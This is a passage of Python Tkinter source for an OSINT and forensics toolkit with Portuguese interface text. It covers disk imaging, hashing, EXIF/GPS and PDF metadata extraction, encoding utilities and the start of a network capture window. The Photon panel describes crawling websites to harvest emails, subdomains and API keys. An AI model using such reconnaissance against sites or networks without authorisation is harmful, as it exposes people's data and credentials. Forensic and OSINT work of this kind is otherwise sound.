        self.out.insert("1.0", "CRIAR IMAGEM NO OSINIT (Linux - Guymager):\n\nSe estás em Linux com CAINE ou Ubuntu:\n1. sudo apt install guymager\n2. sudo guymager\n3. Seleciona disco\n4. Formato E01, compressão, hash\n\nNo Windows com FTK Imager:\nFile > Create Disk Image > Physical Drive > ...\n\nComando Linux dd forense:\nsudo dc3dd if=/dev/sda of=/evidence/disco.dd hash=md5 hash=sha256 log=log.txt\n")

    def calc_hash(self):
        path = filedialog.askopenfilename()
        if not path:
            return
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Calculando hash de {path}...\n")
        def worker():
            try:
                import hashlib
                md5 = hashlib.md5()
                sha1 = hashlib.sha1()
                with open(path, "rb") as f:
                    while chunk := f.read(8192):
                        md5.update(chunk)
                        sha1.update(chunk)
                txt = f"MD5: {md5.hexdigest()}\nSHA1: {sha1.hexdigest()}\n"
                self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}"))
        import threading
        threading.Thread(target=worker, daemon=True).start()

    def passo(self):
        self.out.delete("1.0", "end")
        self.out.insert("1.0", "PASSO A PASSO COMPLETO FTK IMAGER:\n\n1. PREPARAÇÃO:\n   - Disco externo limpo, com espaço\n   - FTK Imager instalado\n   - Documenta: fotos, notas, hora\n\n2. IMAGEM:\n   - File > Create Disk Image > Physical Drive\n   - Seleciona disco suspeito (ex: \\.\PHYSICALDRIVE1)\n   - Add > E01\n   - Case Number: 2024-001\n   - Evidence Number: 1\n   - Examiner: Teu nome\n   - Notes: Descrição\n   - Destination: D:\Evidencias\n   - Filename: disco_suspeito\n   - Fragment: 2000MB\n   - Finish, Start\n\n3. VERIFICAÇÃO:\n   - Verifica MD5/SHA1 no final\n   - Guarda log\n   - Copia hashes para relatório\n")


class ExifToolProTool(ToolWindow):
    """ExifTool Pro - Advanced EXIF"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // ExifTool Pro", "700x500")
        tk.Label(self, text="EXIFTOOL PRO - METADADOS AVANÇADOS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("📁 ANALISAR FICHEIRO", self.analisar), ("🧹 LIMPAR EXIF", self.limpar), ("🌍 MAPA GPS", self.mapa)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.file_path = None
        self.out.insert("1.0", "ExifTool Pro - Metadados avançados\n\nExifTool by Phil Harvey - padrão forense\nLê 200+ formatos: JPG, PNG, PDF, MP4, DOCX, etc\n\nO QUE EXTRAI:\n- GPS (lat/lon)\n- Câmara, lente, configurações\n- Data/hora, software\n- Autor, histórico edições\n- Thumbnail escondido\n\nCOMANDOS:\nexiftool foto.jpg\nexiftool -GPSPosition foto.jpg\nexiftool -all= foto.jpg (limpa)\n\nSeleciona ficheiro para analisar.\n")

    def analisar(self):
        path = filedialog.askopenfilename()
        if not path:
            return
        self.file_path = path
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Analisando {path}...\n\n")
        def worker():
            try:
                # Tenta exiftool se instalado
                import subprocess, shutil
                if shutil.which("exiftool"):
                    result = subprocess.run(["exiftool", path], capture_output=True, text=True, timeout=10)
                    self.after(0, lambda: self.out.insert("end", result.stdout[:5000]))
                else:
                    # Fallback PIL
                    from PIL import Image
                    from PIL.ExifTags import TAGS
                    img = Image.open(path)
                    exif = img._getexif()
                    txt = ""
                    if exif:
                        for tag_id, value in exif.items():
                            tag = TAGS.get(tag_id, tag_id)
                            txt += f"{tag}: {value}\n"
                    else:
                        txt = "Sem EXIF (ou formato não suportado por PIL)\nInstala exiftool: sudo apt install libimage-exiftool-perl\n"
                    self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}\n"))
        import threading
        threading.Thread(target=worker, daemon=True).start()

    def limpar(self):
        if not self.file_path:
            return
        self.out.insert("end", "\n\nLimpando EXIF... exiftool -all= arquivo\nPara limpar, usa: exiftool -all= foto.jpg\nIsso remove GPS, câmara, etc - importante para privacidade!\n")

    def mapa(self):
        self.out.insert("end", "\n\nSe foto tem GPS, abre no Google Maps:\nEx: 38.7223, -9.1393 -> https://www.google.com/maps/search/38.7223,-9.1393\n")


class PhotonTool(ToolWindow):
    """Photon - Fast crawler"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Photon - Crawler", "700x500")
        tk.Label(self, text="PHOTON - CRAWLER RÁPIDO OSINT", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="URL:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.url_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.url_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.url_entry.insert(0, "https://example.com")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🕷️ CRAWL", self.crawl), ("📧 EXTRAIR EMAILS", self.emails)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Photon - Crawler rápido para OSINT\n\nGitHub: https://github.com/s0md3v/Photon\n\nO QUE FAZ:\n- Crawla site completo\n- Extrai URLs, emails, subdomínios\n- Ficheiros, secrets, etc\n- Rápido e leve\n\nUSO:\nphoton --url https://example.com\n\nINSTALAÇÃO:\ngit clone https://github.com/s0md3v/Photon.git\ncd Photon\npip install -r requirements.txt\npython photon.py --url https://example.com\n")

    def crawl(self):
        url = self.url_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Photon crawl para {url}\n\nPara crawl real, instala Photon:\n\ngit clone https://github.com/s0md3v/Photon.git\npython photon.py --url {url}\n\nPhoton vai extrair:\n- URLs internas e externas\n- Emails\n- Ficheiros (pdf, doc, etc)\n- Secrets (API keys)\n")

    def emails(self):
        self.out.insert("end", "\n\nExtração de emails é automática no Photon.\nProcura padrões @dominio no HTML crawleado.\n")


class HashEncodingTool(ToolWindow):
    """Hash & Encoding — OSINT utility para hashes, base64, url, hex, rot13 e hash de ficheiros"""

    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Hash & Encoding", "720x740")
        # Header info
        tk.Label(self, text="INPUT / TEXTO ORIGINAL", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(
            anchor="w", padx=14, pady=(14, 4)
        )
        self.input_text = scrolledtext.ScrolledText(
            self,
            height=6,
            font=(FONT_MONO, 10),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.input_text.pack(fill="x", padx=14, pady=(0, 8))

        # Barra de ações de ficheiro
        file_row = tk.Frame(self, bg=BG)
        file_row.pack(fill="x", padx=14, pady=(0, 8))
        b_file_hash = tk.Button(file_row, text="📁 HASH DE FICHEIRO", command=self.hash_file)
        b_file_hash.pack(side="left", padx=(0, 6), ipady=6)
        style_button(b_file_hash)
        b_clear = tk.Button(file_row, text="🧹 LIMPAR", command=self.clear_all)
        b_clear.pack(side="left", padx=6, ipady=6)
        style_button(b_clear)
        b_swap = tk.Button(file_row, text="🔃 TROCAR IN↔OUT", command=self.swap_io)
        b_swap.pack(side="left", padx=6, ipady=6)
        style_button(b_swap)

        # Hashes
        tk.Label(self, text="HASHES (one-way)", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(
            anchor="w", padx=14, pady=(6, 4)
        )
        hash_frame = tk.Frame(self, bg=BG)
        hash_frame.pack(fill="x", padx=14)
        for algo in ["MD5", "SHA1", "SHA256", "SHA512", "SHA3-256"]:
            b = tk.Button(hash_frame, text=algo, command=lambda a=algo: self.calc_hash(a), width=10)
            b.pack(side="left", padx=3, pady=3, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 8, "bold"))

        # Encoding
        tk.Label(self, text="ENCODING / DECODING", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(
            anchor="w", padx=14, pady=(10, 4)
        )
        enc_frame = tk.Frame(self, bg=BG)
        enc_frame.pack(fill="x", padx=14)
        enc_buttons = [
            ("B64 ENC", self.b64_encode),
            ("B64 DEC", self.b64_decode),
            ("URL ENC", self.url_encode),
            ("URL DEC", self.url_decode),
            ("HEX ENC", self.hex_encode),
            ("HEX DEC", self.hex_decode),
            ("ROT13", self.rot13),
        ]
        for txt, cmd in enc_buttons:
            b = tk.Button(enc_frame, text=txt, command=cmd, width=9)
            b.pack(side="left", padx=3, pady=3, ipady=5)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        # Output
        tk.Label(self, text="OUTPUT / RESULTADO", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(
            anchor="w", padx=14, pady=(10, 4)
        )
        self.output_text = scrolledtext.ScrolledText(
            self,
            height=12,
            font=(FONT_MONO, 10),
            bg=PANEL_BG,
            fg="#00ff88",
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.output_text.pack(fill="both", expand=True, padx=14, pady=(0, 8))

        bottom = tk.Frame(self, bg=BG)
        bottom.pack(fill="x", padx=14, pady=(0, 14))
        b_copy = tk.Button(bottom, text="📋 COPIAR OUTPUT", command=self.copy_output)
        b_copy.pack(side="left", fill="x", expand=True, padx=(0, 6), ipady=6)
        style_button(b_copy)
        b_save = tk.Button(bottom, text="💾 EXPORTAR .TXT", command=self.export_txt)
        b_save.pack(side="left", fill="x", expand=True, padx=(6, 0), ipady=6)
        style_button(b_save)

        self.status = tk.Label(self, text="Pronto. Escreve texto ou carrega ficheiro.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.status.pack(anchor="w", padx=14, pady=(0, 4))

    def _get_input(self):
        return self.input_text.get("1.0", "end-1c")

    def _set_output(self, txt):
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", "end")
        self.output_text.insert("1.0", txt)
        self.output_text.configure(state="normal")

    def calc_hash(self, algo):
        data = self._get_input().encode("utf-8")
        if not data and algo:
            self.status.configure(text="Input vazio.", fg=ERROR)
            return
        try:
            if algo == "MD5":
                h = hashlib.md5(data).hexdigest()
            elif algo == "SHA1":
                h = hashlib.sha1(data).hexdigest()
            elif algo == "SHA256":
                h = hashlib.sha256(data).hexdigest()
            elif algo == "SHA512":
                h = hashlib.sha512(data).hexdigest()
            elif algo == "SHA3-256":
                h = hashlib.sha3_256(data).hexdigest()
            else:
                h = ""
            self._set_output(h)
            self.status.configure(text=f"{algo}: {len(h)} chars | gerado.", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=f"Erro: {e}", fg=ERROR)

    def hash_file(self):
        path = filedialog.askopenfilename(title="Seleciona ficheiro para hash")
        if not path:
            return
        try:
            self.status.configure(text=f"A calcular hashes de {os.path.basename(path)}...", fg=TEXT_DIM)
            self.update()
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            sha512 = hashlib.sha512()
            size = 0
            with open(path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    size += len(chunk)
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
                    sha512.update(chunk)
            out = (
                f"FILE: {path}\n"
                f"SIZE: {size} bytes ({size/1024:.2f} KB)\n\n"
                f"MD5:    {md5.hexdigest()}\n"
                f"SHA1:   {sha1.hexdigest()}\n"
                f"SHA256: {sha256.hexdigest()}\n"
                f"SHA512: {sha512.hexdigest()}\n"
            )
            self.input_text.delete("1.0", "end")
            self.input_text.insert("1.0", path)
            self._set_output(out)
            self.status.configure(text=f"Hashes calculados: {os.path.basename(path)}", fg="#00ff88")
        except Exception as e:
            messagebox.showerror("Erro", str(e))
            self.status.configure(text=f"Erro: {e}", fg=ERROR)

    def b64_encode(self):
        try:
            txt = self._get_input()
            if not txt:
                return
            enc = base64.b64encode(txt.encode("utf-8")).decode("utf-8")
            self._set_output(enc)
            self.status.configure(text="Base64 encode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=f"Erro B64: {e}", fg=ERROR)

    def b64_decode(self):
        try:
            txt = self._get_input().strip()
            if not txt:
                return
            # fix padding
            missing = len(txt) % 4
            if missing:
                txt += "=" * (4 - missing)
            dec = base64.b64decode(txt).decode("utf-8", errors="replace")
            self._set_output(dec)
            self.status.configure(text="Base64 decode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=f"Erro B64 decode: {e}", fg=ERROR)

    def url_encode(self):
        try:
            txt = self._get_input()
            self._set_output(urllib.parse.quote(txt))
            self.status.configure(text="URL encode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=str(e), fg=ERROR)

    def url_decode(self):
        try:
            txt = self._get_input()
            self._set_output(urllib.parse.unquote(txt))
            self.status.configure(text="URL decode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=str(e), fg=ERROR)

    def hex_encode(self):
        try:
            txt = self._get_input()
            self._set_output(binascii.hexlify(txt.encode("utf-8")).decode("utf-8"))
            self.status.configure(text="Hex encode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=str(e), fg=ERROR)

    def hex_decode(self):
        try:
            txt = self._get_input().strip()
            self._set_output(binascii.unhexlify(txt).decode("utf-8", errors="replace"))
            self.status.configure(text="Hex decode OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=f"Hex inválido: {e}", fg=ERROR)

    def rot13(self):
        try:
            import codecs
            txt = self._get_input()
            self._set_output(codecs.encode(txt, "rot_13"))
            self.status.configure(text="ROT13 OK", fg="#00ff88")
        except Exception as e:
            self.status.configure(text=str(e), fg=ERROR)

    def clear_all(self):
        self.input_text.delete("1.0", "end")
        self.output_text.delete("1.0", "end")
        self.status.configure(text="Limpo.", fg=TEXT_DIM)

    def swap_io(self):
        a = self.input_text.get("1.0", "end-1c")
        b = self.output_text.get("1.0", "end-1c")
        self.input_text.delete("1.0", "end")
        self.input_text.insert("1.0", b)
        self.output_text.delete("1.0", "end")
        self.output_text.insert("1.0", a)
        self.status.configure(text="Troca IN↔OUT", fg=TEXT_DIM)

    def copy_output(self):
        txt = self.output_text.get("1.0", "end-1c")
        if txt:
            self.clipboard_clear()
            self.clipboard_append(txt)
            self.status.configure(text="Copiado para clipboard.", fg="#00ff88")

    def export_txt(self):
        txt = self.output_text.get("1.0", "end-1c")
        if not txt:
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT", "*.txt")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"INPUT:\n{self._get_input()}\n\nOUTPUT:\n{txt}\n")
            self.status.configure(text=f"Exportado: {os.path.basename(path)}", fg="#00ff88")


class MetadataTool(ToolWindow):
    """Metadados — lê EXIF de imagens, propriedades de PDF, e info do sistema de ficheiros"""

    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Metadados", "780x720")

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=14, pady=14)

        tk.Label(top, text="FICHEIRO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.path_var = tk.StringVar(value="Nenhum ficheiro selecionado")
        self.path_entry = tk.Entry(
            top,
            textvariable=self.path_var,
            font=(FONT_MONO, 9),
            bg=PANEL_BG,
            fg=TEXT_DIM,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            state="readonly")
        self.path_entry.pack(side="left", fill="x", expand=True, padx=10, ipady=4)

        b_sel = tk.Button(top, text="📁 SELECIONAR", command=self.select_file)
        b_sel.pack(side="left", padx=4, ipady=4)
        style_button(b_sel)

        # Status + warning
        warn = tk.Label(
            self,
            text="⚠ PRIVACIDADE: fotos podem conter GPS, modelo de câmara, data. Verifica antes de partilhar.",
            bg="#1a150a",
            fg="#ffb700",
            font=(FONT_MONO, 7, "bold"),
            wraplength=750,
            justify="left")
        warn.pack(fill="x", padx=14, pady=(0, 10), ipady=6)

        # Tabs
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[10, 6], font=(FONT_MONO, 8, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=14, pady=(0, 10))

        self.tab_fs = tk.Frame(nb, bg=BG)
        self.tab_exif = tk.Frame(nb, bg=BG)
        self.tab_pdf = tk.Frame(nb, bg=BG)
        self.tab_hash = tk.Frame(nb, bg=BG)

        nb.add(self.tab_fs, text=" SISTEMA ")
        nb.add(self.tab_exif, text=" EXIF / IMAGEM ")
        nb.add(self.tab_pdf, text=" PDF / DOC ")
        nb.add(self.tab_hash, text=" HASHES ")

        self.text_fs = self._make_text(self.tab_fs)
        self.text_exif = self._make_text(self.tab_exif)
        self.text_pdf = self._make_text(self.tab_pdf)
        self.text_hash = self._make_text(self.tab_hash)

        bottom = tk.Frame(self, bg=BG)
        bottom.pack(fill="x", padx=14, pady=(0, 14))
        b_analyze = tk.Button(bottom, text="🔍 ANALISAR", command=self.analyze, width=12)
        b_analyze.pack(side="left", padx=3, ipady=6)
        style_button(b_analyze)

        b_export = tk.Button(bottom, text="💾 EXPORTAR RELATÓRIO", command=self.export_report, width=18)
        b_export.pack(side="left", padx=3, ipady=6)
        style_button(b_export)

        b_copy = tk.Button(bottom, text="📋 COPIAR TUDO", command=self.copy_all, width=12)
        b_copy.pack(side="left", padx=3, ipady=6)
        style_button(b_copy)

        b_clear_exif = tk.Button(bottom, text="🧹 INFO LIMPAR EXIF", command=self.info_clear_exif, width=16)
        b_clear_exif.pack(side="right", padx=3, ipady=6)
        b_clear_exif.configure(bg="#1a0a0f", fg=ERROR, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, cursor="hand2")

        self.current_file = None
        self.last_report = ""

        self._set_all("Seleciona um ficheiro para começar.\n\nSuporta: JPG, PNG, HEIC, PDF, MP3, MP4, DOCX, etc.\nEXIF requer Pillow (pip install pillow).\nPDF requer PyMuPDF (pip install PyMuPDF) opcional.")

    def _make_text(self, parent):
        t = scrolledtext.ScrolledText(
            parent,
            font=(FONT_MONO, 9),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            wrap="word")
        t.pack(fill="both", expand=True, padx=8, pady=8)
        return t

    def _set_text(self, widget, txt):
        widget.configure(state="normal")
        widget.delete("1.0", "end")
        widget.insert("1.0", txt)
        widget.configure(state="normal")

    def _set_all(self, txt):
        for w in [self.text_fs, self.text_exif, self.text_pdf, self.text_hash]:
            self._set_text(w, txt)

    def select_file(self):
        path = filedialog.askopenfilename(title="Seleciona ficheiro para metadados")
        if path:
            self.current_file = path
            self.path_var.set(path)
            self.analyze()

    def analyze(self):
        if not self.current_file or not os.path.exists(self.current_file):
            messagebox.showwarning("Aviso", "Seleciona um ficheiro primeiro.")
            return
        path = self.current_file
        try:
            stat = os.stat(path)
            size = stat.st_size
            fs_info = (
                f"══ SISTEMA DE FICHEIROS ══\n"
                f"Caminho: {path}\n"
                f"Nome: {os.path.basename(path)}\n"
                f"Extensão: {os.path.splitext(path)[1] or 'sem extensão'}\n"
                f"Tamanho: {size} bytes ({size/1024:.2f} KB / {size/1024/1024:.2f} MB)\n"
                f"Criado: {datetime.datetime.fromtimestamp(stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Modificado: {datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Acedido: {datetime.datetime.fromtimestamp(stat.st_atime).strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Permissões: {oct(stat.st_mode)[-3:]}\n"
                f"É ficheiro: {os.path.isfile(path)}\n"
            )
            self._set_text(self.text_fs, fs_info)

            # Hashes
            self._calc_hashes(path)

            # EXIF / Imagem
            self._analyze_image(path)

            # PDF / Doc
            self._analyze_pdf(path)

            # Build full report
            self.last_report = f"{fs_info}\n\n{self.text_exif.get('1.0','end-1c')}\n\n{self.text_pdf.get('1.0','end-1c')}\n\n{self.text_hash.get('1.0','end-1c')}"

        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def _calc_hashes(self, path):
        try:
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            with open(path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
            txt = (
                f"══ HASHES DE INTEGRIDADE ══\n"
                f"MD5:    {md5.hexdigest()}\n"
                f"SHA1:   {sha1.hexdigest()}\n"
                f"SHA256: {sha256.hexdigest()}\n"
                f"\nUse para verificar se ficheiro foi alterado."
            )
            self._set_text(self.text_hash, txt)
        except Exception as e:
            self._set_text(self.text_hash, f"Erro hash: {e}")

    def _analyze_image(self, path):
        ext = os.path.splitext(path)[1].lower()
        if ext not in [".jpg", ".jpeg", ".png", ".tiff", ".tif", ".webp", ".heic", ".bmp"]:
            self._set_text(self.text_exif, f"══ EXIF / IMAGEM ══\nNão é imagem suportada para EXIF ({ext}).\nTenta JPG/TIFF.\n\nDica OSINT: fotos de telemóvel guardam GPS, modelo, data/hora.")
            return
        try:
            pil = ensure_package("Pillow", "PIL")
            if pil is None:
                self._set_text(self.text_exif, "══ EXIF / IMAGEM ══\nPillow não instalado.\nExecuta: pip install pillow")
                return
            from PIL import Image
            from PIL.ExifTags import TAGS, GPSTAGS

            img = Image.open(path)
            info = (
                f"══ IMAGEM ══\n"
                f"Formato: {img.format}\n"
                f"Modo: {img.mode}\n"
                f"Dimensões: {img.width} x {img.height} px\n"
                f"Info extra: {img.info}\n\n"
            )

            exif_data = {}
            try:
                raw_exif = img._getexif()
                if raw_exif:
                    for tag_id, value in raw_exif.items():
                        tag = TAGS.get(tag_id, tag_id)
                        exif_data[tag] = value
                else:
                    info += "Sem EXIF encontrado (pode ter sido limpo).\n"
            except Exception:
                info += "Sem EXIF ou erro a ler EXIF.\n"

            if exif_data:
                info += "══ EXIF TAGS ══\n"
                for k, v in exif_data.items():
                    if k == "GPSInfo":
                        continue
                    # Truncar valores muito longos
                    v_str = str(v)
                    if len(v_str) > 200:
                        v_str = v_str[:200] + "..."
                    info += f"{k}: {v_str}\n"

                # GPS específico
                if "GPSInfo" in exif_data:
                    info += "\n══ GPS (ATENÇÃO PRIVACIDADE) ══\n"
                    gps_info = exif_data["GPSInfo"]
                    try:
                        gps_decoded = {}
                        for g_id, g_val in gps_info.items():
                            g_tag = GPSTAGS.get(g_id, g_id)
                            gps_decoded[g_tag] = g_val
                        for gk, gv in gps_decoded.items():
                            info += f"{gk}: {gv}\n"

                        # Tentar converter para graus decimais
                        def to_deg(val):
                            try:
                                d = float(val[0][0]/val[0][1]) if isinstance(val[0], tuple) else float(val[0])
                                m = float(val[1][0]/val[1][1]) if isinstance(val[1], tuple) else float(val[1])
                                s = float(val[2][0]/val[2][1]) if isinstance(val[2], tuple) else float(val[2])
                                return d + m/60 + s/3600
                            except Exception:
                                return None

                        if "GPSLatitude" in gps_decoded and "GPSLongitude" in gps_decoded:
                            lat = to_deg(gps_decoded["GPSLatitude"])
                            lon = to_deg(gps_decoded["GPSLongitude"])
                            if lat is not None and lon is not None:
                                if gps_decoded.get("GPSLatitudeRef") == "S":
                                    lat = -lat
                                if gps_decoded.get("GPSLongitudeRef") == "W":
                                    lon = -lon
                                info += f"\n→ Coordenadas decimais: {lat}, {lon}\n"
                                info += f"→ Google Maps: https://www.google.com/maps?q={lat},{lon}\n"
                    except Exception as e:
                        info += f"Erro GPS parse: {e}\n"
            self._set_text(self.text_exif, info)

        except Exception as e:
            self._set_text(self.text_exif, f"══ EXIF / IMAGEM ══\nErro: {e}")

    def _analyze_pdf(self, path):
        ext = os.path.splitext(path)[1].lower()
        if ext != ".pdf":
            self._set_text(self.text_pdf, f"══ PDF / DOC ══\nNão é PDF ({ext}).\nPara DOCX/MP3/MP4, info básica já está em SISTEMA.")
            return
        try:
            fitz = ensure_package("PyMuPDF", "fitz")
            if fitz is not None:
                doc = fitz.open(path)
                meta = doc.metadata or {}
                txt = f"══ PDF METADATA (PyMuPDF) ══\nPáginas: {len(doc)}\n"
                for k, v in meta.items():
                    if v:
                        txt += f"{k}: {v}\n"
                # Texto extra
                txt += "\n— Primeiro texto (primeiros 500 chars) —\n"
                try:
                    txt += doc[0].get_text()[:500] if len(doc) > 0 else ""
                except Exception:
                    pass
                doc.close()
                self._set_text(self.text_pdf, txt)
                return
        except Exception:
            pass

        # Fallback sem libs externas
        try:
            with open(path, "rb") as f:
                data = f.read(4096)
                txt = f"══ PDF METADATA (básico) ══\n"
                # Procura simples por /Author /Creator etc
                import re
                for field in [b"/Author", b"/Creator", b"/Producer", b"/CreationDate", b"/Title", b"/Subject"]:
                    m = re.search(field + br"\s*\(([^)]+)\)", data)
                    if m:
                        try:
                            txt += f"{field.decode()}: {m.group(1).decode(errors='ignore')}\n"
                        except Exception:
                            pass
                if len(txt) < 50:
                    txt += "Sem metadata legível no header. Instala PyMuPDF para análise completa: pip install PyMuPDF"
                self._set_text(self.text_pdf, txt)
        except Exception as e:
            self._set_text(self.text_pdf, f"Erro PDF: {e}")

    def export_report(self):
        if not self.last_report:
            messagebox.showwarning("Aviso", "Analisa um ficheiro primeiro.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT", "*.txt"), ("JSON", "*.json")])
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.write(self.last_report)
        messagebox.showinfo("Exportado", f"Relatório guardado em {os.path.basename(path)}")

    def copy_all(self):
        self.clipboard_clear()
        self.clipboard_append(self.last_report or "Sem relatório")
        messagebox.showinfo("Copiado", "Relatório copiado para clipboard.")

    def info_clear_exif(self):
        messagebox.showinfo(
            "Limpar EXIF",
            "Para limpar EXIF de forma segura (OSINT - privacidade):\n\n"
            "1. Python: from PIL import Image — abre e guarda com img.save(novo_path) sem exif\n"
            "2. Ferramenta: exiftool -all= foto.jpg\n"
            "3. Online: verifica se site remove EXIF ao upload\n\n"
            "AVISO: este botão não apaga automaticamente para evitar perda de prova. Usa exiftool ou Pillow manualmente."
        )


class WiresharkTool(ToolWindow):
    """Wireshark-like - Analisador de rede: conexões ativas, captura bruta, estatísticas"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Wireshark - Analisador de Rede", "1150x800")
        self.packets = []
        self.capturing = False
        self.capture_thread = None
        self.start_time = None
        self.packet_counter = 0
        self.stats = {"TCP":0, "UDP":0, "ICMP":0, "DNS":0, "HTTP":0, "HTTPS":0, "OTHER":0}
        
        # Top controls
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=10, pady=8)
        
        tk.Label(top, text="INTERFACE:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.if_var = tk.StringVar(value="Todas")
        self.if_combo = ttk.Combobox(top, textvariable=self.if_var, values=["Todas"], width=18, state="readonly")
        self.if_combo.pack(side="left", padx=6)
        
        tk.Label(top, text="MODO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(10,0))
        self.mode_var = tk.StringVar(value="Conexões Ativas (sem admin)")
        mode_combo = ttk.Combobox(top, textvariable=self.mode_var, values=["Conexões Ativas (sem admin)", "Captura Bruta (scapy + admin)", "Monitor Tráfego"], width=28, state="readonly")
        mode_combo.pack(side="left", padx=6)
        mode_combo.bind("<<ComboboxSelected>>", lambda e: self.on_mode_change())
        
        tk.Label(top, text="FILTRO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(10,0))
        self.filter_entry = tk.Entry(top, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=18)
        self.filter_entry.pack(side="left", padx=6, ipady=3)
        self.filter_entry.insert(0, "ex: tcp, 192.168, :443")
        self.filter_entry.bind("<Return>", lambda e: self.apply_filter())
        
        self.btn_start = tk.Button(top, text="▶ INICIAR", command=self.start_capture, bg="#0a1f15", fg="#00ff88", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=4, cursor="hand2")
        self.btn_start.pack(side="left", padx=6)
        self.btn_stop = tk.Button(top, text="■ PARAR", command=self.stop_capture, bg="#1f0a0f", fg=ERROR, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=4, cursor="hand2", state="disabled")
        self.btn_stop.pack(side="left", padx=2)
        
        # Stats bar
